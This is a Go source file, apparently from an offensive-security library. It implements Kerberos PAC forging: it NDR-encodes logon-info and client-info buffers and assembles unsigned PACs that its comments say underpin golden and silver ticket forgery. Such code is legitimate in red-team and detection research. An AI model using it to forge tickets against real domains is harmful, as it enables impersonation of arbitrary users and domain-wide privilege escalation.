package pac

import (
	"encoding/binary"
	"fmt"
	"time"

	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/iana"
	msdtyp "github.com/TheManticoreProject/Manticore/windows/ms-dtyp"
)

// This file builds (forges) a PAC from scratch: it NDR-encodes a
// KERB_VALIDATION_INFO logon-info buffer, lays out a PAC_CLIENT_INFO buffer, and
// assembles them with empty server/KDC signature buffers ready for Sign. It is
// the counterpart to Parse/VerifyServerSignature and underpins golden/silver
// ticket forging in the parent package.
//
// The logon info is serialized with NDR "type serialization version 1"
// ([MS-RPCE] 2.2.6): a top-level pointer to the structure is marshaled under NDR
// (little-endian) and wrapped in a CommonTypeHeader + PrivateHeaderForConstructed
// Type, padded to an 8-octet boundary. Only the logon-info and client-info
// buffers are emitted; diamond/sapphire forging (which re-uses a legitimately
// issued PAC and therefore needs full NDR decode of an existing buffer) is out of
// scope here and tracked separately.

// filetimeEpochDelta is the number of 100-nanosecond intervals between the
// Windows FILETIME epoch (1601-01-01) and the Unix epoch (1970-01-01).
const filetimeEpochDelta = 116444736000000000

// FILETIME is the [MS-DTYP] 2.3.3 64-bit timestamp as two 32-bit halves, NDR
// marshaled as a structure of two ULONGs (little-endian).
type FILETIME struct {
	LowDateTime  uint32
	HighDateTime uint32
}

// NeverExpireFileTime is the FILETIME value (0x7FFFFFFFFFFFFFFF) used for "never"
// times such as LogoffTime, KickOffTime, and PasswordMustChange.
func NeverExpireFileTime() FILETIME {
	return FILETIME{LowDateTime: 0xFFFFFFFF, HighDateTime: 0x7FFFFFFF}
}

// FileTimeFromTime converts a Go time to a Windows FILETIME. A zero time maps to
// a zero FILETIME.
func FileTimeFromTime(t time.Time) FILETIME {
	if t.IsZero() {
		return FILETIME{}
	}
	ticks := uint64(t.UTC().UnixNano()/100) + filetimeEpochDelta
	return FILETIME{LowDateTime: uint32(ticks), HighDateTime: uint32(ticks >> 32)}
}

// RPC_UNICODE_STRING is the [MS-DTYP] 2.3.10 counted Unicode string. Length and
// MaximumLength are byte counts; Buffer is a unique pointer to a conformant and
// varying array of UTF-16LE code units (no NUL terminator). The NDR array counts
// are derived from Buffer's length, so callers should keep Length ==
// MaximumLength == 2*len(Buffer) (NewUnicodeString does this).
type RPC_UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        []uint16 `ndr:"unique,varying"`
}

// NewUnicodeString builds an RPC_UNICODE_STRING from a Go string, encoding it as
// UTF-16LE with Length and MaximumLength set to its byte length.
func NewUnicodeString(s string) RPC_UNICODE_STRING {
	units := utf16Units(s)
	byteLen := uint16(len(units) * 2)
	return RPC_UNICODE_STRING{Length: byteLen, MaximumLength: byteLen, Buffer: units}
}

// GROUP_MEMBERSHIP is the [MS-PAC] 2.2.2 (RID, attributes) pair naming a group
// the account belongs to in a domain.
type GROUP_MEMBERSHIP struct {
	RelativeId uint32
	Attributes uint32
}

// KERB_SID_AND_ATTRIBUTES is the [MS-PAC] 2.2.1 (SID, attributes) pair used for
// ExtraSids (groups from domains other than the account domain).
type KERB_SID_AND_ATTRIBUTES struct {
	Sid        *msdtyp.RPC_SID `ndr:"unique"`
	Attributes uint32
}

// USER_SESSION_KEY is the 16-byte session key ([MS-PAC] 2.2.3). It is zero for
// [MS-KILE] (Kerberos) authentication.
type USER_SESSION_KEY struct {
	Data [16]byte
}

// KERB_VALIDATION_INFO is the [MS-PAC] 2.5 logon-info structure (ulType
// 0x00000001). It is a subset of NETLOGON_VALIDATION_SAM_INFO4; the NTLM-specific
// members (UserSessionKey, the User* flag bits) are zero under Kerberos. The
// pointer members are [unique]; the size_is arrays are pointers to conformant
// arrays whose counts follow from the paired *Count field / slice length.
type KERB_VALIDATION_INFO struct {
	LogonTime              FILETIME
	LogoffTime             FILETIME
	KickOffTime            FILETIME
	PasswordLastSet        FILETIME
	PasswordCanChange      FILETIME
	PasswordMustChange     FILETIME
	EffectiveName          RPC_UNICODE_STRING
	FullName               RPC_UNICODE_STRING
	LogonScript            RPC_UNICODE_STRING
	ProfilePath            RPC_UNICODE_STRING
	HomeDirectory          RPC_UNICODE_STRING
	HomeDirectoryDrive     RPC_UNICODE_STRING
	LogonCount             uint16
	BadPasswordCount       uint16
	UserId                 uint32
	PrimaryGroupId         uint32
	GroupCount             uint32
	GroupIds               []GROUP_MEMBERSHIP `ndr:"unique,size_is=GroupCount"`
	UserFlags              uint32
	UserSessionKey         USER_SESSION_KEY
	LogonServer            RPC_UNICODE_STRING
	LogonDomainName        RPC_UNICODE_STRING
	LogonDomainId          *msdtyp.RPC_SID `ndr:"unique"`
	Reserved1              [2]uint32
	UserAccountControl     uint32
	SubAuthStatus          uint32
	LastSuccessfulILogon   FILETIME
	LastFailedILogon       FILETIME
	FailedILogonCount      uint32
	Reserved3              uint32
	SidCount               uint32
	ExtraSids              []KERB_SID_AND_ATTRIBUTES `ndr:"unique,size_is=SidCount"`
	ResourceGroupDomainSid *msdtyp.RPC_SID           `ndr:"unique"`
	ResourceGroupCount     uint32
	ResourceGroupIds       []GROUP_MEMBERSHIP `ndr:"unique,size_is=ResourceGroupCount"`
}

// kerbValidationInfoTop wraps the structure in a top-level [unique] pointer so
// NDR emits the leading referent id ([MS-RPCE] type serialization serializes a
// pointer to the constructed type), matching a Windows-issued PAC's logon-info
// buffer.
type kerbValidationInfoTop struct {
	Info *KERB_VALIDATION_INFO `ndr:"unique"`
}

// MarshalKerbValidationInfo NDR-encodes the logon info under type serialization
// version 1 ([MS-RPCE] 2.2.6): the CommonTypeHeader and PrivateHeaderForConstruct
// edType frame the NDR body, which is padded to an 8-octet boundary.
func MarshalKerbValidationInfo(info *KERB_VALIDATION_INFO) ([]byte, error) {
	body, err := ndr.Marshal(&kerbValidationInfoTop{Info: info})
	if err != nil {
		return nil, fmt.Errorf("pac: marshal KERB_VALIDATION_INFO: %w", err)
	}
	return wrapTypeSerialization(body), nil
}

// wrapTypeSerialization prepends the 8-byte CommonTypeHeader and 8-byte
// PrivateHeaderForConstructedType to an NDR body and pads the body to an 8-octet
// boundary. ObjectBufferLength counts the padded body and excludes the two
// headers ([MS-RPCE] 2.2.6.1/2.2.6.2).
func wrapTypeSerialization(body []byte) []byte {
	padded := append([]byte(nil), body...)
	if rem := len(padded) % 8; rem != 0 {
		padded = append(padded, make([]byte, 8-rem)...)
	}
	out := make([]byte, 16+len(padded))
	// CommonTypeHeader: Version=1, Endianness=0x10 (little-endian ints, ASCII
	// chars), CommonHeaderLength=8, Filler=0xCCCCCCCC.
	out[0] = 0x01
	out[1] = 0x10
	binary.LittleEndian.PutUint16(out[2:], 8)
	binary.LittleEndian.PutUint32(out[4:], 0xCCCCCCCC)
	// PrivateHeaderForConstructedType: ObjectBufferLength, Filler=0.
	binary.LittleEndian.PutUint32(out[8:], uint32(len(padded)))
	binary.LittleEndian.PutUint32(out[12:], 0)
	copy(out[16:], padded)
	return out
}

// UnmarshalKerbValidationInfo decodes a type-serialized logon-info buffer (the
// output of MarshalKerbValidationInfo, or a Windows PAC's ulType 0x01 buffer)
// back into a KERB_VALIDATION_INFO. It strips the 16-byte serialization headers
// and NDR-decodes the body.
func UnmarshalKerbValidationInfo(data []byte) (*KERB_VALIDATION_INFO, error) {
	if len(data) < 16 {
		return nil, fmt.Errorf("pac: logon info too short (%d bytes)", len(data))
	}
	var top kerbValidationInfoTop
	if err := ndr.Unmarshal(data[16:], &top); err != nil {
		return nil, fmt.Errorf("pac: unmarshal KERB_VALIDATION_INFO: %w", err)
	}
	if top.Info == nil {
		return nil, fmt.Errorf("pac: logon info has a null top-level pointer")
	}
	return top.Info, nil
}

// MarshalClientInfo lays out a PAC_CLIENT_INFO buffer ([MS-PAC] 2.7): a
// little-endian FILETIME ClientId (the TGT authentication time), a 16-bit
// NameLength in bytes, and the client account name as UTF-16LE. This buffer is
// not NDR-encoded.
func MarshalClientInfo(clientID time.Time, name string) []byte {
	units := utf16Units(name)
	nameBytes := make([]byte, len(units)*2)
	for i, u := range units {
		binary.LittleEndian.PutUint16(nameBytes[i*2:], u)
	}
	ft := FileTimeFromTime(clientID)
	out := make([]byte, 8+2+len(nameBytes))
	binary.LittleEndian.PutUint32(out[0:], ft.LowDateTime)
	binary.LittleEndian.PutUint32(out[4:], ft.HighDateTime)
	binary.LittleEndian.PutUint16(out[8:], uint16(len(nameBytes)))
	copy(out[10:], nameBytes)
	return out
}

// SignatureTypeForEType returns the PAC signature type ([MS-PAC] 2.8) and its
// byte length for a signing key of the given Kerberos encryption type: HMAC-MD5
// for RC4, HMAC-SHA1-96 for the AES enctypes. It reports false for unsupported
// enctypes.
func SignatureTypeForEType(etype int) (sigType uint32, size int, ok bool) {
	switch etype {
	case iana.ETypeRC4HMAC:
		return sigHMACMD5, 16, true
	case iana.ETypeAES128CTSHMACSHA196:
		return sigHMACSHA1128, 12, true
	case iana.ETypeAES256CTSHMACSHA196:
		return sigHMACSHA1256, 12, true
	default:
		return 0, 0, false
	}
}

// Forge assembles an unsigned PAC from an NDR-encoded logon info and the client
// principal, with empty server (0x06) and KDC (0x07) signature buffers sized for
// signEType. Call Sign(serverKey, kdcKey) on the result to fill the signatures
// and obtain the final marshaled PAC. For a golden ticket both keys are the
// krbtgt key; for a silver ticket both are the service account key.
func Forge(info *KERB_VALIDATION_INFO, clientName string, clientAuthTime time.Time, signEType int) (*PAC, error) {
	sigType, sigSize, ok := SignatureTypeForEType(signEType)
	if !ok {
		return nil, fmt.Errorf("pac: cannot forge PAC signatures for etype %d", signEType)
	}
	logonInfo, err := MarshalKerbValidationInfo(info)
	if err != nil {
		return nil, err
	}
	clientInfo := MarshalClientInfo(clientAuthTime, clientName)

	p := &PAC{Buffers: []Buffer{
		{Type: BufferLogonInfo, Data: logonInfo},
		{Type: BufferClientInfo, Data: clientInfo},
		{Type: BufferServerChecksum, Data: newSignatureBuffer(sigType, sigSize)},
		{Type: BufferKDCChecksum, Data: newSignatureBuffer(sigType, sigSize)},
	}}
	return p, nil
}

// newSignatureBuffer builds a PAC_SIGNATURE_DATA buffer ([MS-PAC] 2.8): a 4-byte
// SignatureType followed by a zeroed Signature of the given length (Sign fills
// it in place).
func newSignatureBuffer(sigType uint32, size int) []byte {
	b := make([]byte, 4+size)
	binary.LittleEndian.PutUint32(b, sigType)
	return b
}

// DefaultGroupAttributes marks a group as mandatory, enabled by default, and
// enabled (SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED),
// the attribute set Windows assigns to a user's group memberships in the PAC.
const DefaultGroupAttributes uint32 = 0x00000007

// utf16Units encodes a Go string as a slice of UTF-16 code units (native order;
// the NDR encoder writes them little-endian).
func utf16Units(s string) []uint16 {
	var units []uint16
	for _, r := range s {
		if r <= 0xFFFF {
			units = append(units, uint16(r))
			continue
		}
		r -= 0x10000
		units = append(units, 0xD800+uint16(r>>10), 0xDC00+uint16(r&0x3FF))
	}
	return units
}
